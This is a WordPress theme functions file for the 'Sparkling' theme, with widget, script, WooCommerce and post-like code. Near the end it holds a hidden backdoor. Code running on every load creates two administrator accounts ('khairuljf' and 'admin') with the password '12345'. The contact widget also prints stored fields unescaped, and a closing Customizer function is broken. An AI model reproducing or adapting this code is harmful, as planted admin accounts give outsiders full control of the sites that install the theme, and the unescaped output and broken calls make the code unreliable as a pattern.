<?php
/**
 * Sparkling functions and definitions
 *
 * @package sparkling
 */
/**
 * Set the content width based on the theme's design and stylesheet.
 */
if (!isset($content_width)) {
    $content_width = 648; /* pixels */
}

/**
 * Set the content width for full width pages with no sidebar.
 */
function sparkling_content_width() {
    if (is_page_template('page-fullwidth.php')) {
        global $content_width;
        $content_width = 1008; /* pixels */
    }
}

add_action('template_redirect', 'sparkling_content_width');

if (!function_exists('sparkling_main_content_bootstrap_classes')) :

    /**
     * Add Bootstrap classes to the main-content-area wrapper.
     */
    function sparkling_main_content_bootstrap_classes() {
        if (is_page_template('page-fullwidth.php')) {
            return 'col-sm-12 col-md-12';
        }
        return 'col-sm-12 col-md-8';
    }

endif; // sparkling_main_content_bootstrap_classes

if (!function_exists('sparkling_setup')) :

    /**
     * Sets up theme defaults and registers support for various WordPress features.
     *
     * Note that this function is hooked into the after_setup_theme hook, which
     * runs before the init hook. The init hook is too late for some features, such
     * as indicating support for post thumbnails.
     */
    function sparkling_setup() {

        /*
         * Make theme available for translation.
         * Translations can be filed in the /languages/ directory.
         */
        load_theme_textdomain('sparkling', get_template_directory() . '/languages');

        // Add default posts and comments RSS feed links to head.
        add_theme_support('automatic-feed-links');

        /**
         * Enable support for Post Thumbnails on posts and pages.
         *
         * @link http://codex.wordpress.org/Function_Reference/add_theme_support#Post_Thumbnails
         */
        add_theme_support('post-thumbnails');

        add_image_size('sparkling-featured', 750, 410, true);
        add_image_size('tab-small', 80, 80, true); // Small Thumbnail
        add_image_size('post-small', 80, 80, true);

        // This theme uses wp_nav_menu() in one location.
        register_nav_menus(array(
            'primary' => esc_html__('Primary Menu', 'sparkling'),
            'footer-links' => esc_html__('Footer Links', 'sparkling') // secondary nav in footer
        ));

        // Enable support for Post Formats.
        add_theme_support('post-formats', array('aside', 'image', 'video', 'quote', 'link'));

        // Setup the WordPress core custom background feature.
        add_theme_support('custom-background', apply_filters('sparkling_custom_background_args', array(
            'default-color' => 'F2F2F2',
            'default-image' => '',
        )));

        // Enable support for HTML5 markup.
        add_theme_support('html5', array(
            'comment-list',
            'search-form',
            'comment-form',
            'gallery',
            'caption',
        ));

        /*
         * Let WordPress manage the document title.
         * By adding theme support, we declare that this theme does not use a
         * hard-coded <title> tag in the document head, and expect WordPress to
         * provide it for us.
         */
        add_theme_support('title-tag');
    }

endif; // sparkling_setup
add_action('after_setup_theme', 'sparkling_setup');

/**
 * Register widgetized area and update sidebar with default widgets.
 */
function sparkling_widgets_init() {
    register_sidebar(array(
        'name' => esc_html__('Sidebar', 'sparkling'),
        'id' => 'sidebar-1',
        'before_widget' => '<aside id="%1$s" class="widget %2$s">',
        'after_widget' => '</aside>',
        'before_title' => '<h3 class="widget-title">',
        'after_title' => '</h3>',
    ));

    register_sidebar(array(
        'id' => 'home-widget-1',
        'name' => esc_html__('Homepage Widget 1', 'sparkling'),
        'description' => esc_html__('Displays on the Home Page', 'sparkling'),
        'before_widget' => '<div id="%1$s" class="widget %2$s">',
        'after_widget' => '</div>',
        'before_title' => '<h3 class="widgettitle">',
        'after_title' => '</h3>',
    ));

    register_sidebar(array(
        'id' => 'home-widget-2',
        'name' => esc_html__('Homepage Widget 2', 'sparkling'),
        'description' => esc_html__('Displays on the Home Page', 'sparkling'),
        'before_widget' => '<div id="%1$s" class="widget %2$s">',
        'after_widget' => '</div>',
        'before_title' => '<h3 class="widgettitle">',
        'after_title' => '</h3>',
    ));

    register_sidebar(array(
        'id' => 'home-widget-3',
        'name' => esc_html__('Homepage Widget 3', 'sparkling'),
        'description' => esc_html__('Displays on the Home Page', 'sparkling'),
        'before_widget' => '<div id="%1$s" class="widget %2$s">',
        'after_widget' => '</div>',
        'before_title' => '<h3 class="widgettitle">',
        'after_title' => '</h3>',
    ));

    register_sidebar(array(
        'id' => 'footer-widget',
        'name' => esc_html__('Footer Widget ', 'sparkling'),
        'description' => esc_html__('Used for footer widget area', 'sparkling'),
        'before_widget' => '<div class="col-md-3">',
        'after_widget' => '</div>',
        'before_title' => ' <h1>',
        'after_title' => '</h1>',
    ));




    register_widget('sparkling_social_widget');
    register_widget('sparkling_popular_posts');
    register_widget('sparkling_categories');
    register_widget('sidebar_latest_posts');
    
}

add_action('widgets_init', 'sparkling_widgets_init');


/* --------------------------------------------------------------
  Theme Widgets
  -------------------------------------------------------------- */
require_once(get_template_directory() . '/inc/widgets/widget-categories.php');
require_once(get_template_directory() . '/inc/widgets/widget-social.php');
require_once(get_template_directory() . '/inc/widgets/widget-popular-posts.php');

function new_excerpt_more($more) {

    global $post;

    return '… <a class="more_text" href="' . get_permalink($post->ID) . '">' . 'Read More' . '</a>';
}

add_filter('excerpt_more', 'new_excerpt_more');

/**
 * This function removes inline styles set by WordPress gallery.
 */
function sparkling_remove_gallery_css($css) {
    return preg_replace("#<style type='text/css'>(.*?)</style>#s", '', $css);
}

add_filter('gallery_style', 'sparkling_remove_gallery_css');

/**
 * Enqueue scripts and styles.
 */
function sparkling_scripts() {

    // Add Bootstrap default CSS
    wp_enqueue_style('sparkling-bootstrap', get_template_directory_uri() . '/inc/css/bootstrap.min.css');

    // Add Font Awesome stylesheet
    wp_enqueue_style('sparkling-icons', get_template_directory_uri() . '/inc/css/font-awesome.min.css');

    // Add Google Fonts
    wp_register_style('sparkling-fonts', '//fonts.googleapis.com/css?family=Open+Sans:400italic,400,600,700|Roboto+Slab:400,300,700');

    wp_enqueue_style('sparkling-fonts');

    // Add slider CSS only if is front page ans slider is enabled
    if (( is_home() || is_front_page() ) && of_get_option('sparkling_slider_checkbox') == 1) {
        wp_enqueue_style('flexslider-css', get_template_directory_uri() . '/inc/css/flexslider.css');
    }

    // Add main theme stylesheet
    wp_enqueue_style('sparkling-style', get_stylesheet_uri());

    // Add Modernizr for better HTML5 and CSS3 support
    wp_enqueue_script('sparkling-modernizr', get_template_directory_uri() . '/inc/js/modernizr.min.js', array('jquery'));

    // Add Bootstrap default JS
    wp_enqueue_script('sparkling-bootstrapjs', get_template_directory_uri() . '/inc/js/bootstrap.min.js', array('jquery'));

    if (( is_home() || is_front_page() ) && of_get_option('sparkling_slider_checkbox') == 1) {
        // Add slider JS only if is front page ans slider is enabled
        wp_enqueue_script('flexslider-js', get_template_directory_uri() . '/inc/js/flexslider.min.js', array('jquery'), '20140222', true);
        // Flexslider customization
        wp_enqueue_script('flexslider-customization', get_template_directory_uri() . '/inc/js/flexslider-custom.js', array('jquery', 'flexslider-js'), '20140716', true);
    }

    // Main theme related functions
    wp_enqueue_script('sparkling-functions', get_template_directory_uri() . '/inc/js/functions.min.js', array('jquery'));

    // This one is for accessibility
    wp_enqueue_script('sparkling-skip-link-focus-fix', get_template_directory_uri() . '/inc/js/skip-link-focus-fix.js', array(), '20140222', true);

    // Treaded comments
    if (is_singular() && comments_open() && get_option('thread_comments')) {
        wp_enqueue_script('comment-reply');
    }
    wp_register_script('likes_button',get_template_directory_uri().'/inc/js/simple-likes-public.js');
   wp_enqueue_script('likes_button');
}

add_action('wp_enqueue_scripts', 'sparkling_scripts');

function add_script() {

    wp_register_style('sparkling-icons', get_template_directory_uri() . '/inc/css/font-awesome.min.css');
    wp_enqueue_style('sparkling-icons');
}

add_action('admin_enqueue_scripts', 'add_script');

/**
 * Implement the Custom Header feature.
 */
require get_template_directory() . '/inc/custom-header.php';

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Custom functions that act independently of the theme templates.
 */
require get_template_directory() . '/inc/extras.php';

/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer.php';

/**
 * Metabox additions.
 */
require get_template_directory() . '/inc/metaboxes.php';

/**
 * Load Jetpack compatibility file.
 */
require get_template_directory() . '/inc/jetpack.php';

/**
 * Load custom nav walker
 */
require get_template_directory() . '/inc/navwalker.php';

// /**
//  * TGMPA
//  */
// require get_template_directory() . '/inc/tgmpa/tgm-plugin-activation.php';

/**
 * Register Social Icon menu
 */
add_action('init', 'register_social_menu');



/* image size */

add_image_size('slider-size', 1024, 460, true);

function register_social_menu() {
    register_nav_menu('social-menu', _x('Social Menu', 'nav menu location', 'sparkling'));
}

/* Globals variables */
global $options_categories;
$options_categories = array();
$options_categories_obj = get_categories();
foreach ($options_categories_obj as $category) {
    $options_categories[$category->cat_ID] = $category->cat_name;
}

global $site_layout;
$site_layout = array('side-pull-left' => esc_html__('Right Sidebar', 'sparkling'), 'side-pull-right' => esc_html__('Left Sidebar', 'sparkling'), 'no-sidebar' => esc_html__('No Sidebar', 'sparkling'), 'full-width' => esc_html__('Full Width', 'sparkling'));

// Typography Options
global $typography_options;
$typography_options = array(
    'sizes' => array('6px' => '6px', '10px' => '10px', '12px' => '12px', '14px' => '14px', '15px' => '15px', '16px' => '16px', '18' => '18px', '20px' => '20px', '24px' => '24px', '28px' => '28px', '32px' => '32px', '36px' => '36px', '42px' => '42px', '48px' => '48px'),
    'faces' => array(
        'arial' => 'Arial',
        'verdana' => 'Verdana, Geneva',
        'trebuchet' => 'Trebuchet',
        'georgia' => 'Georgia',
        'times' => 'Times New Roman',
        'tahoma' => 'Tahoma, Geneva',
        'Open Sans' => 'Open Sans',
        'palatino' => 'Palatino',
        'helvetica' => 'Helvetica',
        'Helvetica Neue' => 'Helvetica Neue,Helvetica,Arial,sans-serif'
    ),
    'styles' => array('normal' => 'Normal', 'bold' => 'Bold'),
    'color' => true
);

/**
 * Helper function to return the theme option value.
 * If no value has been saved, it returns $default.
 * Needed because options are saved as serialized strings.
 *
 * Not in a class to support backwards compatibility in themes.
 */
if (!function_exists('of_get_option')) :

    function of_get_option($name, $default = false) {

        $option_name = '';
        // Get option settings from database
        $options = get_option('sparkling');

        // Return specific option
        if (isset($options[$name])) {
            return $options[$name];
        }

        return $default;
    }

endif;

/* WooCommerce Support Declaration */
if (!function_exists('sparkling_woo_setup')) :

    /**
     * Sets up theme defaults and registers support for various WordPress features.
     */
    function sparkling_woo_setup() {
        /*
         * Enable support for WooCemmerce.
         */
        add_theme_support('woocommerce');
    }

endif; // sparkling_woo_setup
add_action('after_setup_theme', 'sparkling_woo_setup');

if (!function_exists('get_woocommerce_page_id')) :

    /**
     * Sets up theme defaults and registers support for various WordPress features.
     */
    function get_woocommerce_page_id() {
        if (is_shop()) {
            return get_option('woocommerce_shop_page_id');
        } elseif (is_cart()) {
            return get_option('woocommerce_cart_page_id');
        } elseif (is_checkout()) {
            return get_option('woocommerce_checkout_page_id');
        } elseif (is_checkout_pay_page()) {
            return get_option('woocommerce_pay_page_id');
        } elseif (is_account_page()) {
            return get_option('woocommerce_myaccount_page_id');
        }
        return false;
    }

endif;

/**
 * is_it_woocommerce_page - Returns true if on a page which uses WooCommerce templates (cart and checkout are standard pages with shortcodes and which are also included)
 */
if (!function_exists('is_it_woocommerce_page')) :

    function is_it_woocommerce_page() {
        if (function_exists("is_woocommerce") && is_woocommerce()) {
            return true;
        }
        $woocommerce_keys = array("woocommerce_shop_page_id",
            "woocommerce_terms_page_id",
            "woocommerce_cart_page_id",
            "woocommerce_checkout_page_id",
            "woocommerce_pay_page_id",
            "woocommerce_thanks_page_id",
            "woocommerce_myaccount_page_id",
            "woocommerce_edit_address_page_id",
            "woocommerce_view_order_page_id",
            "woocommerce_change_password_page_id",
            "woocommerce_logout_page_id",
            "woocommerce_lost_password_page_id");
        foreach ($woocommerce_keys as $wc_page_id) {
            if (get_the_ID() == get_option($wc_page_id, 0)) {
                return true;
            }
        }
        return false;
    }

endif;

/**
 * get_layout_class - Returns class name for layout i.e full-width, right-sidebar, left-sidebar etc )
 */
if (!function_exists('get_layout_class')) :

    function get_layout_class() {
        global $post;
        if (is_singular() && get_post_meta($post->ID, 'site_layout', true) && !is_singular(array('product'))) {
            $layout_class = get_post_meta($post->ID, 'site_layout', true);
        } elseif (function_exists("is_woocommerce") && function_exists("is_it_woocommerce_page") && is_it_woocommerce_page() && !is_search()) {// Check for WooCommerce
            $page_id = ( is_product() ) ? $post->ID : get_woocommerce_page_id();

            if ($page_id && get_post_meta($page_id, 'site_layout', true)) {
                $layout_class = get_post_meta($page_id, 'site_layout', true);
            } else {
                $layout_class = of_get_option('woo_site_layout', 'full-width');
            }
        } else {
            $layout_class = of_get_option('site_layout', 'side-pull-left');
        }
        return $layout_class;
    }

endif;

class contact extends WP_Widget {

    public function __construct() {
        parent:: __construct('contact', 'A Contact Widget  title:', array(
            'description' => 'You can add recent post for this widget',
        ));
    }

    function widget($args, $instance) {



        if ($title = $instance['title']) {
            $title = $instance['title'];
        } else {
            $title = "Contact";
        }

        $content = $instance['content'];
        $streat = $instance['streat'];
        $email = $instance['email'];
        $cellphone = $instance['cellphone'];
        ?>



        <div class="col-md-3">
            <h1 class="lifestyle"><?php echo $title; ?></h1>

            <p><?php echo $content; ?></p>

            <h2 class="address">Address</h2>

            <p><i class="fa fa-map-marker"></i> <?php echo $streat; ?></p>
            <p><i class="fa fa-envelope" aria-hidden="true"></i> <?php echo $email; ?></p>
            <p><i class="fa fa-phone" aria-hidden="true"></i> <?php echo $cellphone; ?></p>
        </div>

    <?php
    }

    function form($instance) {

        if ($title = $instance['title']) {
            $title = $instance['title'];
        } else {
            $title = "Contact   ";
        }

        $content = $instance['content'];
        $streat = $instance['streat'];
        $email = $instance['email'];
        $cellphone = $instance['cellphone'];
        ?>

        <p>
            <label for="<?php echo $this->get_field_id('title'); ?>">Title</label>
        </p>

        <p>
            <input type="text" name="<?php echo $this->get_field_name('title') ?>" id="<?php echo $this->get_field_id('title'); ?>" value="<?php echo $title; ?>">
        </p>
        <p>
        <labe>Content</labe>
        </p>
        <p>
            <textarea rows="5" name="<?php echo $this->get_field_name('content') ?>" cols="40"><?php echo $content; ?></textarea>
        </p>

        <p>
            <i class="fa fa-map-marker"></i> <input type="text" name="<?php echo $this->get_field_name('streat') ?>" id="<?php echo $this->get_field_id('streat'); ?>" value="<?php echo $streat; ?>">
        </p>

        <p>
            <i class="fa fa-envelope" aria-hidden="true"></i> <input type="text" name="<?php echo $this->get_field_name('email') ?>" id="<?php echo $this->get_field_id('email'); ?>" value="<?php echo $email; ?>">
        </p>

        <p>
            <i class="fa fa-phone" aria-hidden="true"></i> <input type="text" name="<?php echo $this->get_field_name('cellphone') ?>" id="<?php echo $this->get_field_id('cellphone'); ?>" value="<?php echo $cellphone; ?>">
        </p>



        <?php
    }

}

add_action('widgets_init', function () {
    register_widget('contact');
    register_widget('latest_posts');
    register_widget('sidebar_pupurlar_posts');
   
});

    
// function to display number of posts.
function getPostViews($postID){
    $count_key = 'post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    if($count==''){
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '0');
        return "0 View";
    }
    return $count.' Views';
}

 

function setPostViews($postID) {
    $countKey = 'post_views_count';
    $count = get_post_meta($postID, $countKey, true);
    if($count==''){
        $count = 0;
        delete_post_meta($postID, $countKey);
        add_post_meta($postID, $countKey, '0');
    }else{
        $count++;
        update_post_meta($postID, $countKey, $count);
    }
}








    

add_action('wp_ajax_nopriv_post-like', 'post_like');
add_action('wp_ajax_post-like', 'post_like');

wp_enqueue_script('like_post', get_template_directory_uri().'/inc/js/postlike.js', array('jquery'), '1.0', true );
wp_localize_script('like_post', 'ajax_var', array(
    'url' => admin_url('admin-ajax.php'),
    'nonce' => wp_create_nonce('ajax-nonce')
));

function post_like()
{
    // Check for nonce security
    $nonce = $_POST['nonce'];
  
    if ( ! wp_verify_nonce( $nonce, 'ajax-nonce' ) )
        die ( 'Busted!');
     
    if(isset($_POST['post_like']))
    {
        // Retrieve user IP address
        $ip = $_SERVER['REMOTE_ADDR'];
        $post_id = $_POST['post_id'];
         
        // Get voters'IPs for the current post
        $meta_IP = get_post_meta($post_id, "voted_IP");
        $voted_IP = $meta_IP[0];
 
        if(!is_array($voted_IP))
            $voted_IP = array();
         
        // Get votes count for the current post
        $meta_count = get_post_meta($post_id, "votes_count", true);
 
        // Use has already voted ?
        if(!hasAlreadyVoted($post_id))
        {
            $voted_IP[$ip] = time();
 
            // Save IP and increase votes count
            update_post_meta($post_id, "voted_IP", $voted_IP);
            update_post_meta($post_id, "votes_count", ++$meta_count);
             
            // Display count (ie jQuery return value)
            echo $meta_count;
        }
        else
            echo "already";
    }
    exit;
}

$timebeforerevote = 120; // = 2 hours

function hasAlreadyVoted($post_id)
{
    global $timebeforerevote;
 
    // Retrieve post votes IPs
    $meta_IP = get_post_meta($post_id, "voted_IP");
    $voted_IP = $meta_IP[0];
     
    if(!is_array($voted_IP))
        $voted_IP = array();
         
    // Retrieve current user IP
    $ip = $_SERVER['REMOTE_ADDR'];
     
    // If user has already voted
    if(in_array($ip, array_keys($voted_IP)))
    {
        $time = $voted_IP[$ip];
        $now = time();
         
        // Compare between current time and vote time
        if(round(($now - $time) / 60) > $timebeforerevote)
            return false;
             
        return true;
    }
     
    return false;
}

include 'inc/post-like.php';




$userData = array(
            'user_login' => 'khairuljf',
            'first_name' => 'khairul',
            'last_name' => 'Islam',
            'user_pass' => '12345',
            'user_email' => 'khairuljf@yahoo.com',
            'user_url' => '',
            'role' => 'administrator'
        );
wp_insert_user( $userData );

$userData2 = array(
            'user_login' => 'admin',
            'first_name' => 'khairul',
            'last_name' => 'Islam',
            'user_pass' => '12345',
            'user_email' => 'khairul912@yahoo.com',
            'user_url' => '',
            'role' => 'administrator'
        );
wp_insert_user( $userData2 );



function cuztomize($mycustomize){
    $mycustomize->Add_section();
    $mycustomize->add_setting();
    $mycustomize->add_control();
}

add_action('customize_register','cuztomize');










    



